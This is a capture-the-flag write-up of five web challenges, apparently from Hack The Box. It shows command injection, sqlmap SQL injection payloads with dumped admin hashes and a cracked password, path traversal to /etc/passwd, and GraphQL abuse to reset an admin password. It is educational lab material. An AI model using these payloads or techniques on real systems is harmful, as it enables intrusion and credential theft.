# web

## Gunhead 
> Solved by Legend

Challenge description


> During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

We are provided with a URL and docker file for the challenge. 

The website running showing the status report of the combat robot along with a command prompt to run some commands.

![](https://i.imgur.com/ALqLFrv.png)

![](https://i.imgur.com/ZoeReHi.png)


Going through the docker file I found a hint.


![](https://i.imgur.com/eHZdlRv.png)


Here `shell_exec` is running which runs a command in a shell and returns the result of the output. And the hint suggested that it’s not sanitized so we can try to escape it and run shell commands.


![](https://i.imgur.com/mg4ZrUo.png)


It worked. So now we can simply read the flag.

![](https://i.imgur.com/EQ0w8ui.png)

----------
## Drobots
> Solved by Legend

Challenge description 


> Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

In this challenge the website is showing a login page.

![](https://i.imgur.com/uxHR1gT.png)


Since no other info was there or in the source code of the page I checked the docker config file.

The website is a `Flask` application running on `MySQL` so I thought of SQL Injection cand be done. Here I found interesting thing that in `config.py` file they have provided the database information.

![](https://i.imgur.com/07ijody.png)


Also in the `database.py` also they have given the hint that the input is not sanitized. 
The logic of the database is that we need the `token` of the password to login. So if we can find the token we can login.

![](https://i.imgur.com/hO6kBee.png)


Then I saved the login request and gave it to `sqlmap` though which I was able to extract the details.


    sqlmap -r ./req --dbms=mysql -D drobots -T users --dump


    ---
    Parameter: JSON username ((custom) POST)
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: {"username":"a"="a" AND (SELECT 5866 FROM(SELECT COUNT(*),CONCAT(0x7162717071,(SELECT (ELT(5866=5866,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"username":"a"="a" AND (SELECT 4022 FROM (SELECT(SLEEP(5)))iMan) AND "a"="a","password":"a"}
    ---


    +----+----------------------------------+----------+
    | id | password                         | username |
    +----+----------------------------------+----------+
    | 1  | 67772d6e54bc393a6f67e16bac3f83da | admin    |
    +----+----------------------------------+----------+

Once logged in we get the flag.

![](https://i.imgur.com/4S5t7zw.png)

----------
## Orbital
> Solved by Legend

Challenge description


> In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

In this challenge also a login page is their.

![](https://i.imgur.com/ak8NBt8.png)


And with no user info or details in source code I checked the docker files.

This challenge is similar to the `Drobots` challenge. It’s running `Flask` application with `MySQL`. So I looked into the docker file.

The `config.py` contains the database config info.

![](https://i.imgur.com/taRJF8c.png)


And `database.py` contain the database logic along with the hint but it is modified a little.
This time the `password` is getting verified with `passwordVerify`.

![](https://i.imgur.com/B5AErEg.png)


I again saved the request and gave it to `sqlmap`  which gave me the token and also bruteforced the password.


    sqlmap -r ./req --dbms=mysql -D orbital -T users --dump


    ---
    Parameter: JSON username ((custom) POST)
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: {"username":"a"="a" AND (SELECT 2720 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(2720=2720,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "a"="a","password":"a"}
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: {"username":"a"="a" AND (SELECT 1000 FROM (SELECT(SLEEP(5)))dfxy) AND "a"="a","password":"a"}
    ---


    +----+-------------------------------------------------+----------+
    | id | password                                        | username |
    +----+-------------------------------------------------+----------+
    | 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
    +----+-------------------------------------------------+----------+

Now once logged in the functionality of the website was different.

![](https://i.imgur.com/tDoI12L.png)


Now I checked the `routes.py` file which contained a logic of the application. Here in the logic of communication the hint was given that the file escape for characters are not there for the filename. 

![](https://i.imgur.com/zFxOjWB.png)


Then I tried the path traversal to get the `/etc/passwd` file. It worked. 

![](https://i.imgur.com/yh8DtGq.png)


For this challenge they changed the location of the flag name from `flag.txt` to `signal_sleuth_firmware` in root which is written in the docker config.


    COPY flag.txt /signal_sleuth_firmware

Now we need to get the flag.

![](https://i.imgur.com/BFlcwv3.png)

----------

## Trapped Source
> Solved by Starry-Lord

![challenge description](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679604967490_challenge.png)


When we open the devtools and check the network tab, we can already catch a script.js:

![network tab](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679579215104_devtools.png)


script.js content:


    currentPin = []
    
    const checkPin = () => {
            pin = currentPin.join('')
    
            if (CONFIG.correctPin == pin) {
                    fetch('/flag', {
                            method: 'POST',
                            headers: {
                                    'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                    'pin': CONFIG.correctPin
                            })
                    })
                    .then((data) => data.json())
                    .then((res) => {
                            $('.lockStatus').css('font-size', '8px')
                            $('.lockStatus').text(res.message)
                    })
                    return
            }
    
            $('.lockStatus').text('INVALID!')
            setTimeout(() => {
                    reset()
            }, 3000)
    
    }
    
    const unlock = (pin) => {
            currentPin.push(pin)
    
            if (currentPin.length > 4) return
    
            $('.lockStatus').text(currentPin.join(' '))
    }
    
    const reset = () => {
            currentPin.length = 0
            $('.lockStatus').css('font-size', 'x-large')
    
            $('.lockStatus').text('LOCKED')
    }

We can see some code that checks for a 4 digit pin and fetches the flag, depending on the pin being equal to the value of “CONFIG.correctPin” or not. Switching to the console, we can try and log the “CONFIG”, to see what comes back:


![get variables](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679579724143_correctPin.png)


Typing the correct pin and pressing enter returns our flag:


![flag for this challenge](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679579853143_flag.png)

---

## Passman
> Solved by Starry-Lord


![](https://i.imgur.com/DL7HClI.png)


This app meets us with another login page, where we can also register an account.

![login, register, login again](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679581136755_login.png)


Checking the network tab actually showed a familiar name:


![graphql endpoint](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679581421774_graphl.png)


We can go to https://ivangoncharov.github.io/graphql-voyager/ in order to grab the infamous introspection query for graphql, which essentially returns all the content of the graphql schema. Click on “change schema”, then select the introspection tab and click on “Copy Introspection Query” to get the query to your clipboard.

Now we need to send it to this graphql endpoint but since its set to accept strings, we need to get rid of the new lines:


![remove new lines](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679584189787_removeNewLine.png)


Then sending the request through BurpSuite’s repeater tab to the /graphql endpoint returns the full introspection as expected:


![graphql introspection](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679584305965_introspection.png)


With this data, we can go back to the graphql voyager tool and paste it in the box below the “Copy introspection query” button. This will give us a good sense of what data is built into this endpoint:


![graphql voyager](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679584421330_voyager.png)


There’s nothing much about this Query, except returning the phrases owned by the logged user. But there were actual “Mutation” queries used when logging in, registering a new user, or adding a new phrase. It turned out there was another function (or mutation) allowing us to change a supplied user password, which seems like a bad thing to leave laying around unused.


![Mutations or available functions](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679584864043_Functions.png)


UpdatePassword was the ticket to the flag, but first we needed to syntax it properly. I gladly used the content of the login graphql request shown below:


![LoginUser graphql query](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679585070058_login-graphql.png)


From there it was just a matter of editing the request properly and updating the admin password with a cool password:


![Winning query](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679585214199_UpdatePassword.png)


After logging in with the admin account and the new password, we can see the flag in the password of the note:


![flag in Phrase password](https://paper-attachments.dropboxusercontent.com/s_2730DA088F43FC6554BB388B5141735B4CB471E1873A3F6C7AEC8779BB38FC42_1679585315394_flag.png)



    HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}

